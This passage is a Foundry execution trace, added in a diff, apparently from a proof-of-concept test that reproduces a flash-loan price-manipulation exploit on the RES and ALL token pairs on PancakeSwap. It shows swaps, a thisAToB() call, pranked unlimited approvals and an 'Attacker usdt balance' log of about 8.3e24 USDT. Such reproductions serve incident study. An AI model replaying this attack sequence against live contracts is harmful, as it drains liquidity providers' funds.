+    │   │   │   │   ├─ emit Transfer(from: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], to: 0x55E9d467d778DCAeea53AC11C9aBB58298a973dF, value: 21698917479 [2.169e10])
+    │   │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]
+    │   │   │   │   ├─ [893] USDT_RES_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 7412959340324276831181132 [7.412e24], 3902952440989 [3.902e12], 1665051347 [1.665e9]
+    │   │   │   │   ├─ [465] USDT_RES_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(32548376218 [3.254e10], 3902952440989 [3.902e12], 7412959340324276831181132 [7.412e24]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 61156528118546113564431 [6.115e22]
+    │   │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7) [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]
+    │   │   │   │   ├─ [893] USDT_ALL_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 480129195968803076456 [4.801e20], 41761128268609605264847 [4.176e22], 1665044901 [1.665e9]
+    │   │   │   │   ├─ [465] USDT_ALL_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7
+    │   │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(61156528118546113564431 [6.115e22], 41761128268609605264847 [4.176e22], 480129195968803076456 [4.801e20]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 285016241394222410828 [2.85e20]
+    │   │   │   │   ├─ [6418] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7::transfer(0x3F693Effc53908d517F186A20431f756C90c2229, 285016241394222410828 [2.85e20])
+    │   │   │   │   │   ├─ [439] USDT_ALL_PAIR::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 4475079325253002664477 [4.475e21]
+    │   │   │   │   │   ├─ emit Transfer(from: RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], to: 0x3F693Effc53908d517F186A20431f756C90c2229, value: 285016241394222410828 [2.85e20])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]
+    │   │   │   │   ├─ [893] USDT_RES_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 7412959340324276831181132 [7.412e24], 3902952440989 [3.902e12], 1665051347 [1.665e9]
+    │   │   │   │   ├─ [465] USDT_RES_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(86795669916 [8.679e10], 3902952440989 [3.902e12], 7412959340324276831181132 [7.412e24]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 160872097620124276813934 [1.608e23]
+    │   │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7) [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]
+    │   │   │   │   ├─ [893] USDT_ALL_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 480129195968803076456 [4.801e20], 41761128268609605264847 [4.176e22], 1665044901 [1.665e9]
+    │   │   │   │   ├─ [465] USDT_ALL_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7
+    │   │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(160872097620124276813934 [1.608e23], 41761128268609605264847 [4.176e22], 480129195968803076456 [4.801e20]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 380981526161535308928 [3.809e20]
+    │   │   │   │   ├─ [6418] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7::transfer(0xe3f0C9F99BECced5197300d64ea3a814ECD862f7, 380981526161535308928 [3.809e20])
+    │   │   │   │   │   ├─ [439] USDT_ALL_PAIR::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 4475079325253002664477 [4.475e21]
+    │   │   │   │   │   ├─ emit Transfer(from: RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], to: 0xe3f0C9F99BECced5197300d64ea3a814ECD862f7, value: 380981526161535308928 [3.809e20])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ emit Transfer(from: USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], to: 0x3F693Effc53908d517F186A20431f756C90c2229, value: 922203992870 [9.222e11])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   └─ ← [Return] 10274136736514808378277308 [1.027e25]
+    │   │   │   ├─ [563] RES_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   └─ ← [Return] 2818006567024 [2.818e12]
+    │   │   │   ├─ emit Sync(reserve0: 10274136736514808378277308 [1.027e25], reserve1: 2818006567024 [2.818e12])
+    │   │   │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 2861177396190531547096176 [2.861e24], amount1In: 0, amount0Out: 0, amount1Out: 1084945873965 [1.084e12], to: 0x3F693Effc53908d517F186A20431f756C90c2229)
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [0] console::log("[FlashLoan] swap 6 over") [staticcall]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [154952] RES_TOKEN::thisAToB()
+    │   │   │   ├─ emit Approval(owner: RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], spender: PS_ROUTER: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 11871329810460 [1.187e13])
+    │   │   │   ├─ [100581] PS_ROUTER::swapExactTokensForTokensSupportingFeeOnTransferTokens(11871329810460 [1.187e13], 0, [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21, 0x55d398326f99059fF775485246999027B3197955, 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7], RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], 1665051347 [1.665e9])
+    │   │   │   │   ├─ [13758] RES_TOKEN::transferFrom(RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], 11871329810460 [1.187e13])
+    │   │   │   │   │   ├─ [439] USDT_RES_PAIR::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 5607099684513225068 [5.607e18]
+    │   │   │   │   │   ├─ emit Transfer(from: RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], to: USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], value: 11871329810460 [1.187e13])
+    │   │   │   │   │   ├─ emit Approval(owner: RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], spender: PS_ROUTER: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 0)
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [541] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7::balanceOf(RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 27317198736360776443503 [2.731e22]
+    │   │   │   │   ├─ [893] USDT_RES_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 10274136736514808378277308 [1.027e25], 2818006567024 [2.818e12], 1665051347 [1.665e9]
+    │   │   │   │   ├─ [563] RES_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 14689336377484 [1.468e13]
+    │   │   │   │   ├─ [23193] USDT_RES_PAIR::swap(8299153098464700338369656 [8.299e24], 0, USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb], 0x)
+    │   │   │   │   │   ├─ [8071] USDT_TOKEN::transfer(USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb], 8299153098464700338369656 [8.299e24])
+    │   │   │   │   │   │   ├─ emit Transfer(from: USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], to: USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb], value: 8299153098464700338369656 [8.299e24])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 1974983638050108039907652 [1.974e24]
+    │   │   │   │   │   ├─ [563] RES_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 14689336377484 [1.468e13]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 1974983638050108039907652 [1.974e24], reserve1: 14689336377484 [1.468e13])
+    │   │   │   │   │   ├─ emit Swap(sender: PS_ROUTER: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 11871329810460 [1.187e13], amount0Out: 8299153098464700338369656 [8.299e24], amount1Out: 0, to: USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb])
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [893] USDT_ALL_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 480129195968803076456 [4.801e20], 41761128268609605264847 [4.176e22], 1665044901 [1.665e9]
+    │   │   │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 8340914226733309943634503 [8.34e24]
+    │   │   │   │   ├─ [48305] USDT_ALL_PAIR::swap(477719299806949541931 [4.777e20], 0, RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], 0x)
+    │   │   │   │   │   ├─ [15921] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7::transfer(RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], 477719299806949541931 [4.777e20])
+    │   │   │   │   │   │   ├─ [439] USDT_ALL_PAIR::totalSupply() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 4475079325253002664477 [4.475e21]
+    │   │   │   │   │   │   ├─ emit Transfer(from: USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb], to: RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], value: 477719299806949541931 [4.777e20])
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [541] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7::balanceOf(USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 2409896161853534525 [2.409e18]
+    │   │   │   │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 8340914226733309943634503 [8.34e24]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 2409896161853534525 [2.409e18], reserve1: 8340914226733309943634503 [8.34e24])
+    │   │   │   │   │   ├─ emit Swap(sender: PS_ROUTER: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 8299153098464700338369656 [8.299e24], amount0Out: 477719299806949541931 [4.777e20], amount1Out: 0, to: RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21])
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ [541] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7::balanceOf(RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 27794918036167725985434 [2.779e22]
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ emit Transfer(from: USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], to: 0x0000000000000000000000000000000000000000, value: 11871329810460 [1.187e13])
+    │   │   │   ├─ [9006] USDT_RES_PAIR::sync()
+    │   │   │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1974983638050108039907652 [1.974e24]
+    │   │   │   │   ├─ [563] RES_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 2818006567024 [2.818e12]
+    │   │   │   │   ├─ emit Sync(reserve0: 1974983638050108039907652 [1.974e24], reserve1: 2818006567024 [2.818e12])
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [0] VM::prank(0x3F693Effc53908d517F186A20431f756C90c2229)
+    │   │   │   └─ ← [Return] 
+    │   │   ├─ [24688] RES_TOKEN::approve(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: 0x3F693Effc53908d517F186A20431f756C90c2229, spender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [0] VM::prank(0x3F693Effc53908d517F186A20431f756C90c2229)
+    │   │   │   └─ ← [Return] 
+    │   │   ├─ [24688] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7::approve(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: 0x3F693Effc53908d517F186A20431f756C90c2229, spender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [563] RES_TOKEN::balanceOf(0x3F693Effc53908d517F186A20431f756C90c2229) [staticcall]
+    │   │   │   └─ ← [Return] 91626595063115 [9.162e13]
+    │   │   ├─ emit log_named_decimal_uint(key: "[FlashLoan] Res Token Balance of address(user)", val: 91626595063115 [9.162e13], decimals: 8)
+    │   │   ├─ [541] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7::balanceOf(0x3F693Effc53908d517F186A20431f756C90c2229) [staticcall]
+    │   │   │   └─ ← [Return] 1088270069500508040221 [1.088e21]
+    │   │   ├─ emit log_named_decimal_uint(key: "[FlashLoan] All Token Balance of address(user)", val: 1088270069500508040221 [1.088e21], decimals: 18)
+    │   │   ├─ [541] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7::balanceOf(0x3F693Effc53908d517F186A20431f756C90c2229) [staticcall]
+    │   │   │   └─ ← [Return] 1088270069500508040221 [1.088e21]
+    │   │   ├─ [35346] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7::transferFrom(0x3F693Effc53908d517F186A20431f756C90c2229, USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb], 1088270069500508040221 [1.088e21])
+    │   │   │   ├─ [439] USDT_ALL_PAIR::totalSupply() [staticcall]
+    │   │   │   │   └─ ← [Return] 4475079325253002664477 [4.475e21]
+    │   │   │   ├─ [465] USDT_ALL_PAIR::token0() [staticcall]
+    │   │   │   │   └─ ← [Return] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7
+    │   │   │   ├─ [397] USDT_ALL_PAIR::token1() [staticcall]
+    │   │   │   │   └─ ← [Return] USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   ├─ [893] USDT_ALL_PAIR::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 2409896161853534525 [2.409e18], 8340914226733309943634503 [8.34e24], 1665051347 [1.665e9]
+    │   │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]) [staticcall]
+    │   │   │   │   └─ ← [Return] 8340914226733309943634503 [8.34e24]
+    │   │   │   ├─ emit Transfer(from: 0x3F693Effc53908d517F186A20431f756C90c2229, to: USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb], value: 870616055600406432176 [8.706e20])
+    │   │   │   ├─ emit Approval(owner: 0x3F693Effc53908d517F186A20431f756C90c2229, spender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 115792089237316195423570985008687907853269984665640564038369313938412621599714 [1.157e77])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [0] console::log("transfer all token over") [staticcall]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [893] USDT_ALL_PAIR::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 2409896161853534525 [2.409e18], 8340914226733309943634503 [8.34e24], 1665051347 [1.665e9]
+    │   │   ├─ [38271] USDT_ALL_PAIR::swap(0, 8314162195518672693528035 [8.314e24], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   ├─ [23171] USDT_TOKEN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 8314162195518672693528035 [8.314e24])
+    │   │   │   │   ├─ emit Transfer(from: USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 8314162195518672693528035 [8.314e24])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [541] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7::balanceOf(USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]) [staticcall]
+    │   │   │   │   └─ ← [Return] 873025951762259966701 [8.73e20]
+    │   │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]) [staticcall]
+    │   │   │   │   └─ ← [Return] 26752031214637250106468 [2.675e22]
+    │   │   │   ├─ emit Sync(reserve0: 873025951762259966701 [8.73e20], reserve1: 26752031214637250106468 [2.675e22])
+    │   │   │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 870616055600406432176 [8.706e20], amount1In: 0, amount0Out: 0, amount1Out: 8314162195518672693528035 [8.314e24], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [531] USDT_TOKEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 8314162195518672693528035 [8.314e24]
+    │   │   ├─ emit log_named_decimal_uint(key: "[FlashLoan] sell Alltoken over, Attacker usdt balance is", val: 8314162195518672693528035 [8.314e24], decimals: 18)
+    │   │   ├─ [97596] RES_TOKEN::transferFrom(0x3F693Effc53908d517F186A20431f756C90c2229, USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], 91626595063115 [9.162e13])
+    │   │   │   ├─ [439] USDT_RES_PAIR::totalSupply() [staticcall]
+    │   │   │   │   └─ ← [Return] 5607099684513225068 [5.607e18]
+    │   │   │   ├─ [465] USDT_RES_PAIR::token0() [staticcall]
+    │   │   │   │   └─ ← [Return] USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   ├─ [397] USDT_RES_PAIR::token1() [staticcall]
+    │   │   │   │   └─ ← [Return] RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21]
+    │   │   │   ├─ [893] USDT_RES_PAIR::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 1974983638050108039907652 [1.974e24], 2818006567024 [2.818e12], 1665051347 [1.665e9]
+    │   │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   └─ ← [Return] 1974983638050108039907652 [1.974e24]
+    │   │   │   ├─ emit Transfer(from: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], to: 0x8a08757fB9331ABEE2453C726f93Aea3FF2d078A, value: 3665063802524 [3.665e12])
+    │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
+    │   │   │   │   └─ ← [Return] USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]
+    │   │   │   ├─ [893] USDT_RES_PAIR::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 1974983638050108039907652 [1.974e24], 2818006567024 [2.818e12], 1665051347 [1.665e9]
+    │   │   │   ├─ [465] USDT_RES_PAIR::token0() [staticcall]
+    │   │   │   │   └─ ← [Return] USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(916265950631 [9.162e11], 2818006567024 [2.818e12], 1974983638050108039907652 [1.974e24]) [staticcall]
+    │   │   │   │   └─ ← [Return] 483680335584506689531917 [4.836e23]
+    │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7) [staticcall]
+    │   │   │   │   └─ ← [Return] USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]
+    │   │   │   ├─ [893] USDT_ALL_PAIR::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 873025951762259966701 [8.73e20], 26752031214637250106468 [2.675e22], 1665051347 [1.665e9]
+    │   │   │   ├─ [465] USDT_ALL_PAIR::token0() [staticcall]
+    │   │   │   │   └─ ← [Return] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7
+    │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(483680335584506689531917 [4.836e23], 26752031214637250106468 [2.675e22], 873025951762259966701 [8.73e20]) [staticcall]
+    │   │   │   │   └─ ← [Return] 827161546774528966984 [8.271e20]
+    │   │   │   ├─ [6418] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7::transfer(0x3F693Effc53908d517F186A20431f756C90c2229, 827161546774528966984 [8.271e20])
+    │   │   │   │   ├─ [439] USDT_ALL_PAIR::totalSupply() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 4475079325253002664477 [4.475e21]
+    │   │   │   │   ├─ emit Transfer(from: RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], to: 0x3F693Effc53908d517F186A20431f756C90c2229, value: 827161546774528966984 [8.271e20])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
+    │   │   │   │   └─ ← [Return] USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]
+    │   │   │   ├─ [893] USDT_RES_PAIR::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 1974983638050108039907652 [1.974e24], 2818006567024 [2.818e12], 1665051347 [1.665e9]
+    │   │   │   ├─ [465] USDT_RES_PAIR::token0() [staticcall]
+    │   │   │   │   └─ ← [Return] USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(4581329753155 [4.581e12], 2818006567024 [2.818e12], 1974983638050108039907652 [1.974e24]) [staticcall]
+    │   │   │   │   └─ ← [Return] 1221653236775876789071764 [1.221e24]
+    │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7) [staticcall]
+    │   │   │   │   └─ ← [Return] USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]
+    │   │   │   ├─ [893] USDT_ALL_PAIR::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 873025951762259966701 [8.73e20], 26752031214637250106468 [2.675e22], 1665051347 [1.665e9]
+    │   │   │   ├─ [465] USDT_ALL_PAIR::token0() [staticcall]
+    │   │   │   │   └─ ← [Return] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7
+    │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(1221653236775876789071764 [1.221e24], 26752031214637250106468 [2.675e22], 873025951762259966701 [8.73e20]) [staticcall]
+    │   │   │   │   └─ ← [Return] 854272030190867572575 [8.542e20]
+    │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
+    │   │   │   │   └─ ← [Return] USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]
+    │   │   │   ├─ [893] USDT_RES_PAIR::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 1974983638050108039907652 [1.974e24], 2818006567024 [2.818e12], 1665051347 [1.665e9]
+    │   │   │   ├─ [465] USDT_RES_PAIR::token0() [staticcall]
+    │   │   │   │   └─ ← [Return] USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]
